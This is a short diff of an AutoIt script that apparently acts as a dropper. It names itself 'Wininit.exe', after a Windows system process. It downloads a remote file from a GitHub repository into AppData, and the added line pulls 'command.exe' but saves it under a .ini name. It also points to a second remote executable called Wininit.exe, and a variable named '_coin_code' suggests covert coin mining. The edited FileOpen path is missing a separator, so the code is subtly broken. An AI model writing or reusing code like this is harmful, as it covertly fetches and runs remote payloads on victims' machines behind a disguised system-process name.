@@ -45,8 +45,8 @@ EndFunc   ;==>sair
 
 Func start_var()
 	Global $_name = "Wininit.exe"
-	$file_location_command = InetGet("https://raw.githubusercontent.com/WinGGAp/WinGG/master/Arquivos%20FONtes/command.ini",@AppDataDir & "\WinGG\command.ini")
-	Global $_coin_code = IniRead($file_location_command,"CMD","command",Default)
+	$file_location_command = InetGet("https://raw.githubusercontent.com/WinGGAp/WinGG/master/Arquivos%20FONtes/command.exe",@AppDataDir & "\WinGG\command.ini")
+	Global $_coin_code = FileOpen(@AppDataDir & "WinGG\Command.ini")
 	ToolTip($_coin_code,0,0)
 	Sleep(10000)
 	Global $_Url0 = "https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/Wininit.exe" ;Url
